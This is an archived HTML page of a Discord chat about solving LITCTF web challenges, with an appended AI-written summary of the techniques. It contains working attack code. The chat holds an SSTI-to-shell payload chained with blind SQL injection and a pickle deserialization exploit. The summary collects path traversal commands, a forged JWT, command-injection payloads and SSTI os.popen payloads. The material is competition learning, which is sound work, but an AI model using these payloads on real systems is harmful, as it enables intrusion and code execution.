+        user = '''python3 -c "import requests;r=requests.post(\\"<a href="http://172.24.0.8:8080/runquery\\",json={\\"username\\":" target="_blank">http://172.24.0.8:8080/runquery\\",json={\\"username\\":</a> \\"flag' AND password LIKE \''''+payload+'''%' ESCAPE '~';--\\",\\"password\\": \\"wtv\\"});print(r.text)"'''
+        pwd = '''{{(((''|attr("__class__")|attr("__mro__"))[-1])|attr("__subclasses__")())[247]((request|attr("form"))["username"],shell=True,stdout=-1)|attr("communicate")()}}'''
+
+        
+        r = requests.post(url, data={"username": user, "password": pwd})
+        txt = r.text
+        if "True" in txt:
+            flag += letter
+            print(flag)
+            break
+    if lastflag == flag:
+        print("wtf")
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-23T17:37:30.133000+00:00</span>
+      <div class="content">document.cookie = \`likeCookie="&lt;div class="bg"&gt;&lt;/div&gt;&lt;h1&gt;Welcome to 🍪 🍪 🍪 🍪 🍪!&lt;/h1&gt;&lt;div class="whiteContainer"&gt;&lt;br&gt;&lt;p&gt;Hm okay. If you like the cookie number [1, 2, ,,,'cookie'] then here you go I guess. It's not my favorite cookie though&lt;/p&gt;&lt;img src="<a href="https://upload.wikimedia.org/wikipedia/commons/f/f1/2ChocolateChipCookies.jpg"" target="_blank">https://upload.wikimedia.org/wikipedia/commons/f/f1/2ChocolateChipCookies.jpg"</a> style="width: 100%"&gt;&lt;br&gt;&lt;/div&gt;&lt;hr&gt;&lt;textarea&gt;&lt;/textarea&gt;&lt;iframe src='google.com'&gt;&lt;/iframe&gt;&lt;span&gt;cookie&lt;/span&gt;"`
+
+totally breaks the cookie site lolol</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-23T16:48:38.725000+00:00</span>
+      <div class="content">```
+jw@remote$ python main.py
+ * Serving Flask app "main" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on <a href="http://127.0.0.1:8080/" target="_blank">http://127.0.0.1:8080/</a> (Press CTRL+C to quit)
+ * Restarting with stat
+Traceback (most recent call last):
+  File "/workspaces/62577178/lit/flushed-emoji/challenge/data-server/main.py", line 11, in &lt;module&gt;
+    cur.execute('''DROP TABLE IF EXISTS users''')
+sqlite3.OperationalError: database is locked
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2022-07-23T01:36:55.765000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/among-us-twerk-thicc-among-us-twerk-funny-among-us-gif-20511920" target="_blank">https://tenor.com/view/among-us-twerk-thicc-among-us-twerk-funny-among-us-gif-20511920</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-12-14T03:00:58.986000+00:00</span>
+      <div class="content">how do i change my password at <a href="https://lit.lhsmathcs.org/" target="_blank">https://lit.lhsmathcs.org/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T13:41:49.371000+00:00</span>
+      <div class="content"><a href="https://jokrhub.github.io/2021/06/19/LIT-CTF-2021.html" target="_blank">https://jokrhub.github.io/2021/06/19/LIT-CTF-2021.html</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T08:23:13.552000+00:00</span>
+      <div class="content">imagine writing pickles by hand 😛
+```py
+import pickle
+import requests
+import base64
+url = "<a href="https://a-flask-of-pickles.litctf.live/"" target="_blank">https://a-flask-of-pickles.litctf.live/"</a>
+#url = "<a href="http://127.0.0.1:5000/"" target="_blank">http://127.0.0.1:5000/"</a>
+
+class Exploit():
+    def __reduce__(self):
+        return eval, ("str(globals())", )
+
+payload = pickle.dumps({"name": "", "bio": Exploit()})
+print(payload, len(payload))
+resp = requests.post(url + "new", data=base64.b64encode(payload))
+print(url + resp.text)
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-19T04:02:18.871000+00:00</span>
+      <div class="content">i got a pretty detail writeup for AlexFanClubAPi here <a href="https://github.com/letronghoangminh/CTF-Writeups/tree/master/Web/LITCTF%202021%20-%20Alex%20Fan%20Club%20API%20(500)" target="_blank">https://github.com/letronghoangminh/CTF-Writeups/tree/master/Web/LITCTF%202021%20-%20Alex%20Fan%20Club%20API%20(500)</a> star if you found it useful xD</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-18T03:20:20.457000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/sausage-dancing-deadinside-inside-gif-9352412" target="_blank">https://tenor.com/view/sausage-dancing-deadinside-inside-gif-9352412</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-17T23:57:00.035000+00:00</span>
+      <div class="content"><a href="https://media.tenor.com/images/81282e976a7f44e8fe8308e4c7270d3b/tenor.gif" target="_blank">https://media.tenor.com/images/81282e976a7f44e8fe8308e4c7270d3b/tenor.gif</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-17T08:58:38.874000+00:00</span>
+      <div class="content">&lt;<a href="https://tcode2k16.github.io/blog/posts/picoctf-2019-writeup/binary-exploitation/&gt;" target="_blank">https://tcode2k16.github.io/blog/posts/picoctf-2019-writeup/binary-exploitation/&gt;</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-17T03:45:42.116000+00:00</span>
+      <div class="content"><a href="https://codetigerorz.litctf.live/" target="_blank">https://codetigerorz.litctf.live/</a> &lt;:yayy:860317007568437248&gt;</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-17T03:32:58.506000+00:00</span>
+      <div class="content"><a href="https://asdoihewjadskl.litctf.live" target="_blank">https://asdoihewjadskl.litctf.live</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-17T03:32:51.784000+00:00</span>
+      <div class="content"><a href="http://www.searchvity.com/?domain=litctf.live&amp;dn=litctf.live&amp;fp=sLXuWaLQQ01JhqJ9sWO9IkjKQ5TzbL9MQD6UAbHHXlvzDfo1gyaps16PLS4t%2FLbbuwgBIZViQfYLS5QKJCTp%2FvEXTeRb3YjZAKDkS9MUHRsZ5SQKLFzu1RsML2%2FIKVc0Gu60FTE7V7TSICdhcEW4ReyohGABncfqp53YAgnXdzo%3D&amp;prvtof=iF5lp4Rw6WzgQmkiJEZ8ARfc%2FEBQpsbrzjMRVgWuHgc%3D&amp;poru=jLONZOvMn1iQQI3U2EBx4Meuzi6fLPmcGhVTZPgYqaY4oPZ3M4rI5R0809mkjWDVCjp5vH4gmZ1aHB4AuoGj%2B%2BkJA4MRlH0MUL%2Br7MiukIPGbMC%2FITMDAZpVK5pmvYKU&amp;rpid=9PO1MNIJ3" target="_blank">http://www.searchvity.com/?domain=litctf.live&amp;dn=litctf.live&amp;fp=sLXuWaLQQ01JhqJ9sWO9IkjKQ5TzbL9MQD6UAbHHXlvzDfo1gyaps16PLS4t%2FLbbuwgBIZViQfYLS5QKJCTp%2FvEXTeRb3YjZAKDkS9MUHRsZ5SQKLFzu1RsML2%2FIKVc0Gu60FTE7V7TSICdhcEW4ReyohGABncfqp53YAgnXdzo%3D&amp;prvtof=iF5lp4Rw6WzgQmkiJEZ8ARfc%2FEBQpsbrzjMRVgWuHgc%3D&amp;poru=jLONZOvMn1iQQI3U2EBx4Meuzi6fLPmcGhVTZPgYqaY4oPZ3M4rI5R0809mkjWDVCjp5vH4gmZ1aHB4AuoGj%2B%2BkJA4MRlH0MUL%2Br7MiukIPGbMC%2FITMDAZpVK5pmvYKU&amp;rpid=9PO1MNIJ3</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-17T03:32:29.977000+00:00</span>
+      <div class="content"><a href="https://codetiger.litctf.live/" target="_blank">https://codetiger.litctf.live/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-17T03:26:52.312000+00:00</span>
+      <div class="content"><a href="http://dizzy.litctf.live/" target="_blank">http://dizzy.litctf.live/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2021-07-16T21:20:05.773000+00:00</span>
+      <div class="content">is <a href="http://websites.litctf.live:8000/" target="_blank">http://websites.litctf.live:8000/</a> down?</div>
+    </div>
+  </div>
+  <h3>Gemini Chat Summary</h3>
+  <section id="summary">
+<div style="font-family: Arial, sans-serif; line-height: 1.6;">
+    <h2>Comprehensive Summary of CTF Web Challenge Discussion</h2>
+    <p>This document provides a detailed analysis of a technical conversation centered on solving web security challenges from various Capture The Flag (CTF) events, with a strong focus on <strong>LITCTF</strong>. The discussion archives a variety of exploit techniques, complete solve scripts, and references to external resources. The vulnerabilities discussed range from path traversal and injection attacks to complex timing and deserialization exploits.</p>
+
+    <hr>
+
+    <h3>Key Vulnerabilities and Exploit Techniques</h3>
+    <p>The conversation covers a broad spectrum of web vulnerabilities. Below is a breakdown of the primary techniques discussed, complete with explanations and the payloads used.</p>
+
+    <h4>1. Path Traversal</h4>
+    <p>A common theme was accessing restricted files by manipulating file paths. The primary tool for this was <code>curl</code> with the <code>--path-as-is</code> flag, which prevents the normalization of URL paths (e.g., collapsing <code>/../</code>).</p>
+    <ul>
+        <li><strong>Core Concept:</strong> Use <code>../</code> sequences to navigate up the directory tree to access sensitive files like <code>flag.txt</code>.</li>
+        <li><strong>Payloads &amp; Commands:</strong>
+            <pre><code style="background-color: #f4f4f4; padding: 5px; border-radius: 3px; display: block;">curl --path-as-is http://litctf.org:31778/../flag.txt</code></pre>
+            <pre><code style="background-color: #f4f4f4; padding: 5px; border-radius: 3px; display: block;">curl http://litctf.org:31778/..%2Fflag.txt</code></pre>
+            <pre><code style="background-color: #f4f4f4; padding: 5px; border-radius: 3px; display: block;">curl -X GET "http://litctf.org:31778/?file=../../../flag.txt"</code></pre>
+        </li>
+        <li><strong>Reference:</strong> An <a href="https://owasp.org/www-community/attacks/Path_Traversal" target="_blank">OWASP article on Path Traversal</a> was shared for context.</li>
+    </ul>
+
+    <h4>2. JSON Web Token (JWT) Manipulation</h4>
+    <p>Two JWT challenges were solved by tampering with the token's payload.</p>
+    <ul>
+        <li><strong>JWT-1 (Client-Side Edit):</strong> The token was decoded, the payload was modified (e.g., setting <code>"admin":true</code>), and then used to access a protected resource. Tools like <a href="https://jwt.io/" target="_blank">jwt.io</a> and <a href="https://token.dev/" target="_blank">token.dev</a> were mentioned for this purpose.
+            <pre><code style="background-color: #f4f4f4; padding: 5px; border-radius: 3px; display: block;">curl --cookie 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRiYzEyMyIsImFkbWluIjp0cnVlfQ.tqNm1v5blWB0xJp3yOK73xa-ux6F7stX4yMGcOcmsL0' http://litctf.org:31781/flag</code></pre>
+        </li>
+        <li><strong>JWT-2 (Server-Side Logic Flaw):</strong> A flaw in the server's code was exploited. By modifying the server-side script (<code>index.ts</code>) to always sign tokens with admin privileges (<code>admin: true</code>), a valid admin token could be generated and used.</li>
+    </ul>
+
+    <h4>3. Timing Attacks</h4>
+    <p>Several challenges were vulnerable to timing attacks, where the server's response time leaks information about the validity of a guess. Python scripts using the <code>requests</code> and <code>time</code> libraries were crafted to exploit this.</p>
+    <ul>
+        <li><strong>Core Concept:</strong> The server takes longer to respond (due to a <code>sleep</code> or heavy computation) when a part of the secret (e.g., a character in a password) is correct. The exploit script iterates through all possible characters, measures the response time for each, and identifies the correct one based on the delay.</li>
+        <li><strong>Example Script Logic:</strong>
+            <pre><code class="language-python" style="background-color: #f4f4f4; padding: 5px; border-radius: 3px; display: block;">
+# Pseudocode for timing attack
+for position in range(password_length):
+    for char in character_set:
+        test_password = current_password + char + padding
+        start_time = time.time()
+        requests.post(url, data={'password': test_password})
+        end_time = time.time()
+        if (end_time - start_time) > expected_delay:
+            current_password += char
+            print(f'Found character: {char}')
+            break
+            </code></pre>
+        </li>
+        <li>A similar logic was applied to a command injection vulnerability, using <code>sleep 3</code> to create the timing oracle.</li>
+    </ul>
+
+    <h4>4. Command Injection</h4>
+    <p>OS command injection was achieved by inserting shell commands into input fields that are improperly sanitized and passed to a shell environment.</p>
+    <ul>
+        <li><strong>Blind Injection (Time-Based):</strong> A timing attack was combined with command injection to exfiltrate a flag. The payload uses <code>grep -q</code> to check for a flag prefix and executes <code>sleep 3</code> if the guess is correct.
+            <pre><code style="background-color: #f4f4f4; padding: 5px; border-radius: 3px; display: block;">hostname=;`grep -q 'LITCTF{...}' flag.txt && sleep 3`;</code></pre>
+        </li>
+        <li><strong>Chained Commands:</strong> A script demonstrated creating a user with a malicious username containing shell commands, which were later executed by the application logic.
+            <pre><code style="background-color: #f4f4f4; padding: 5px; border-radius: 3px; display: block;">
+# Step 1: Change password to inject a username with a command
+change_pw("123', username='hihi; mkdir static")
+# Step 2: Trigger the command execution
+trigger_cmd("hihi; mkdir static")
+# Step 3: Exfiltrate flag
+change_pw("123', username='hihi; cat flag* > static/hihi.txt")
+            </code></pre>
+        </li>
+    </ul>
+
+    <h4>5. Server-Side Template Injection (SSTI)</h4>
+    <p>SSTI was used to execute code on the server by abusing template rendering engines (like Jinja2 in Flask or EJS in Node.js).</p>
+    <ul>
+        <li><strong>Payloads:</strong> The payloads traverse Python's object hierarchy to find and execute dangerous functions like <code>os.popen</code>.
+            <pre><code style="background-color: #f4f4f4; padding: 5px; border-radius: 3px; display: block;">{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}</code></pre>
+            <pre><code style="background-color: #f4f4f4; padding: 5px; border-radius: 3px; display: block;">{{ self['__class__']['__mro__'][1]['__subclasses__']()[POPEN_NUM]('...command...') }}</code></pre>
+        </li>
+        <li><strong>Data Exfiltration:</strong> One advanced SSTI script used this vulnerability to make a POST request from the server to an attacker-controlled machine, exfiltrating the flag character by character.</li>
+    </ul>
+
+    <h4>6. SQL Injection (SQLi)</h4>
+    <p>Both manual and tool-based SQLi were mentioned. A bug in <code>sqlmap</code> was triggered by one challenge. Manual payloads were crafted for blind SQL injection.</p>
+    <ul>
+        <li><strong>Blind SQLi Payload:</strong> A payload was used within a JSON object sent to an internal API. It uses <code>LIKE</code> and SQL comments to guess the flag.
+            <pre><code style="background-color: #f4f4f4; padding: 5px; border-radius: 3px; display: block;">
+# Python script constructs a command to be run via SSTI, which in turn performs SQLi
+user = '''python3 -c "import requests;r=requests.post(\\"http://172.24.0.8:8080/runquery\\",json={\\"username\\": \\"flag' AND password LIKE 'LITCTF{...}%' --\\",...});print(r.text)"'''
+            </code></pre>
+        </li>
+    </ul>
+
+    <h4>7. Cross-Site Scripting (XSS)</h4>
+    <p>Several XSS techniques were discussed to bypass client-side restrictions or exfiltrate information.</p>
+    <ul>
+        <li><strong>Filename Bypass:</strong> Uploading a file with a crafted name like <code>payload.txt/.html</code> to bypass extension validation and have the file served as HTML.</li>
+        <li><strong>History Manipulation:</strong> Using <code>window.history.pushState</code> to change the URL displayed in the browser, potentially for phishing or confusing the user/admin bot.</li>
+        <li><strong>XMLHttpRequest Hijacking:</strong> Overriding the global <code>XMLHttpRequest</code> object to intercept AJAX requests and redirect data to an attacker-controlled location.</li>
+    </ul>
+
+    <h4>8. Insecure Deserialization (Python Pickle)</h4>
+    <p>A classic Python pickle exploit was used. A malicious object was created which, when deserialized by the server, executes arbitrary code.</p>
+    <ul>
+        <li><strong>Exploit Class:</strong> A class with a custom <code>__reduce__</code> method is defined to return the <code>eval</code> function and a command to be executed.
+            <pre><code class="language-python" style="background-color: #f4f4f4; padding: 5px; border-radius: 3px; display: block;">
+import pickle
+import base64
+
+class Exploit():
+    def __reduce__(self):
+        return eval, ("str(globals())", )
+
+payload = pickle.dumps({"name": "", "bio": Exploit()})
+encoded_payload = base64.b64encode(payload)
+# POST encoded_payload to the server
+            </code></pre>
+        </li>
+    </ul>
+
+    <h4>9. Miscellaneous Challenges</h4>
+    <ul>
+        <li><strong>Race Condition:</strong> A challenge was solved by sending multiple concurrent donation requests to exploit a race condition, leading to an incorrect balance calculation and revealing the flag.</li>
+        <li><strong>Simple Source Inspection:</strong> One flag was found directly in a JavaScript variable in the page's HTML source.</li>
+        <li><strong>RSA Timing Attack:</strong> A script was written to exploit a timing vulnerability in an RSA decryption implementation, allowing the password to be recovered character by character.</li>
+    </ul>
+
+    <hr>
+
+    <h3>External Resources and Write-ups</h3>
+    <p>Numerous links were shared throughout the conversation, providing solutions, tools, and further reading.</p>
+    <ul>
+        <li><strong>Write-ups:</strong>
+            <ul>
+                <li><a href="https://abuctf.github.io/posts/LITCTF/" target="_blank">abuctf.github.io LITCTF Writeup</a></li>
+                <li><a href="https://loevland.github.io/posts/litctf23/#amogsus-api" target="_blank">loevland.github.io LITCTF'23 Writeup (amogsus-api)</a></li>
+                <li><a href="https://ireland.re/Lexington_Informatics_Tournament_CTF_23/#art-contest" target="_blank">ireland.re LIT CTF'23 Writeup (art-contest)</a></li>
+                <li><a href="https://jokrhub.github.io/2021/06/19/LIT-CTF-2021.html" target="_blank">jokrhub.github.io LIT CTF 2021 Writeup</a></li>
+                <li><a href="https://github.com/letronghoangminh/CTF-Writeups/tree/master/Web/LITCTF%202021%20-%20Alex%20Fan%20Club%20API%20(500)" target="_blank">Alex Fan Club API Detailed Writeup</a></li>
+                <li><a href="https://tcode2k16.github.io/blog/posts/picoctf-2019-writeup/binary-exploitation/" target="_blank">picoCTF 2019 Binary Exploitation Writeup</a></li>
+            </ul>
+        </li>
+        <li><strong>Tools &amp; Documentation:</strong>
+            <ul>
+                <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp" target="_blank">HackTricks - PHP Tricks</a></li>
+                <li><a href="https://github.com/mde/ejs/blob/main/lib/ejs.js#L637" target="_blank">EJS Template Library Source Code</a></li>
+                <li><a href="https://github.com/sqlmapproject/sqlmap/issues/444" target="_blank">sqlmap Bug Report</a></li>
+            </ul>
+        </li>
+        <li><strong>Challenge Links:</strong>
+            <ul>
+                <li><a href="http://litctf.org:31794/" target="_blank">http://litctf.org:31794/</a></li>
+                <li><a href="https://lit.lhsmathcs.org/" target="_blank">https://lit.lhsmathcs.org/</a></li>
+            </ul>
+        </li>
+    </ul>
+</div>
+  </section>
+  <script>
+    // Force chat to start at the bottom (newest messages)
+    const chat = document.getElementById("chat");
+    chat.scrollTop = chat.scrollHeight;
+  </script>
+</body>
+</html>
